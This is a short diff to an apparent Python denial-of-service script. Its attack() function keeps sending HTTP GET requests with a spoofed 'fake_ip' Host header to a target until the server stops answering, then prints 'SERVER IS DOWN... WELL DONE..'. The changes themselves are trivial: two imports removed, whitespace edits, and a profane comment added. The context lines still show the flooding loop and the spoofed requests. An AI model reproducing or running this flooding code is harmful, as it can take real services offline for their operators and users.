@@ -3,8 +3,6 @@ try:
     import threading
     import random
     import sys
-    import ipaddress
-    import struct
     from time import sleep
     import colorama
 except Exception as e:
@@ -83,13 +81,13 @@ def attack():
             if retries <= 0:
                 print("""
                 
-                SERVER IS DOWN... WELL DONE..
+                SERVER IS DOWN... WELL DONE..  
                 
-                """)
+                """) 
                 exit(2)
             retries -= 1
         else:
-            retries = 5
+            retries = 5 #what the fuck is this, what the fuck have i done
 
         s.sendto((f"GET / {target} HTTP/1.1\r\n").encode('ascii'), (target, int(port)))
         s.sendto((f"Host: {fake_ip} \r\n\r\n").encode('ascii'), (target, int(port)))
